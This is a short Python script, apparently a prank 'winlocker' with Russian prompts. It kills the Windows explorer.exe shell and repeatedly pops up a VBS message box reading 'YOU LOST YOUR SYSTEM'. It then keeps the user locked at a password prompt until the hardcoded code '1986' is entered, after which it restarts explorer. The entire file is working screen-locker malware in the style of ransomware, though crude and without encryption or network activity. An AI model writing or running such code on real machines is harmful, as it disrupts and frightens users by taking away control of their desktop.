import time 
import subprocess 
import os 
os.system("taskkill /f /im  explorer.exe") 
my_file = open('biden.vbs', 'w+') 
my_file.write('msgbox"YOU LOST YOUR SYSTEM", 0, "WINLOCKER"') 
my_file.close() 
subprocess.call("cscript biden.vbs") 
subprocess.call("cscript biden.vbs") 
subprocess.call("cscript biden.vbs") 
subprocess.call("cscript biden.vbs") 
 
h = 0 
while h < 200: 
    print('WINLOCKED', h) 
    h = h+1 
    time.sleep(0.01) 
print('введите пароль') 
passw =  0 
a = input(': ') 
if a == '1986': 
    passw = 1 
while passw == 0: 
    print('неверно!') 
    a = input(': ') 
    if a == '1986': 
        passw = 1 
subprocess.Popen('explorer') 
input('ВЕРНО! enter для выхода')
